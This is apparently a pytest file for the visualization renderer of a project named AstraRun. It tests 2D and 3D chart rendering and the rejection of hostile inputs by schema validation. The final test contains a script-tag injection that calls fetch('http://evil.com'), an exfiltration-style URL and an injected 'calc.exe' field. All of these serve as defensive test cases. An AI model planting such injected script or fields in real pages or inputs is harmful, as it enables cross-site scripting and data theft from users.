"""Section 5: Trusted Visualization Tests for AstraRun C2.2.

Evaluates declarative schema validation, out-of-process renderer execution under Job Object,
2D and 3D plot generation, PNG/SVG format validation, and hostile input rejections.
"""

import tempfile
from pathlib import Path
import pytest
from pydantic import ValidationError

from astrarun.visualization.models import ChartType, SeriesSpec, VisualizationSpec
from astrarun.visualization.renderer import render_visualization


def test_visualization_2d_line_and_scatter():
    with tempfile.TemporaryDirectory() as td:
        out_png = Path(td) / "test_2d.png"
        spec = {
            "title": "Quarterly Performance",
            "series": [
                {
                    "name": "Revenue",
                    "chart_type": "line",
                    "x": [1.0, 2.0, 3.0, 4.0],
                    "y": [10.5, 14.2, 18.0, 22.4],
                    "color": "blue",
                    "line_width": 2.0,
                },
                {
                    "name": "Target",
                    "chart_type": "scatter",
                    "x": [1.0, 2.0, 3.0, 4.0],
                    "y": [12.0, 15.0, 17.5, 21.0],
                    "color": "red",
                    "marker": "o",
                },
            ],
            "x_axis": {"label": "Quarter"},
            "y_axis": {"label": "USD Millions"},
            "show_grid": True,
            "show_legend": True,
        }

        res = render_visualization(spec=spec, output_path=str(out_png))
        assert res.success
        assert out_png.exists()
        assert out_png.stat().st_size > 0
        with open(out_png, "rb") as f:
            header = f.read(8)
            assert header == b"\x89PNG\r\n\x1a\n"


def test_visualization_3d_surface():
    with tempfile.TemporaryDirectory() as td:
        out_3d = Path(td) / "test_surface.png"
        spec = {
            "title": "Bivariate Loss Landscape",
            "series": [
                {
                    "name": "Loss Function",
                    "chart_type": "surface_3d",
                    "x": [-2.0, -1.0, 0.0, 1.0, 2.0],
                    "y": [-2.0, -1.0, 0.0, 1.0, 2.0],
                    "z_matrix": [
                        [8.0, 5.0, 4.0, 5.0, 8.0],
                        [5.0, 2.0, 1.0, 2.0, 5.0],
                        [4.0, 1.0, 0.0, 1.0, 4.0],
                        [5.0, 2.0, 1.0, 2.0, 5.0],
                        [8.0, 5.0, 4.0, 5.0, 8.0],
                    ],
                    "color": "viridis",
                }
            ],
            "x_axis": {"label": "Param 1"},
            "y_axis": {"label": "Param 2"},
            "z_axis": {"label": "Loss"},
            "camera": {"elevation": 35.0, "azimuth": -45.0},
        }

        res = render_visualization(spec=spec, output_path=str(out_3d))
        assert res.success
        assert out_3d.exists()
        assert out_3d.stat().st_size > 0


def test_hostile_visualization_rejections():
    # 1. Script tag injection in title
    with pytest.raises(ValidationError):
        VisualizationSpec(
            title="<script>fetch('http://evil.com')</script>",
            series=[SeriesSpec(x=[1.0, 2.0], y=[3.0, 4.0])],
        )

    # 2. Remote URL in axis label
    with pytest.raises(ValidationError):
        VisualizationSpec(
            title="Safe Title",
            series=[SeriesSpec(x=[1.0, 2.0], y=[3.0, 4.0])],
            x_axis={"label": "https://malicious.org/exfil"},
        )

    # 3. Non-finite values (NaN / Inf)
    with pytest.raises(ValidationError):
        SeriesSpec(x=[1.0, float("nan")], y=[2.0, 3.0])

    with pytest.raises(ValidationError):
        SeriesSpec(x=[1.0, float("inf")], y=[2.0, 3.0])

    # 4. Unknown/extra field injection
    with pytest.raises(ValidationError):
        VisualizationSpec(
            title="Safe",
            series=[SeriesSpec(x=[1.0, 2.0], y=[3.0, 4.0])],
            malicious_command="calc.exe",  # extra field
        )

    # 5. Length cap violation (> 100k points)
    huge_arr = [float(i) for i in range(100_001)]
    with pytest.raises(ValidationError):
        SeriesSpec(x=huge_arr, y=huge_arr)
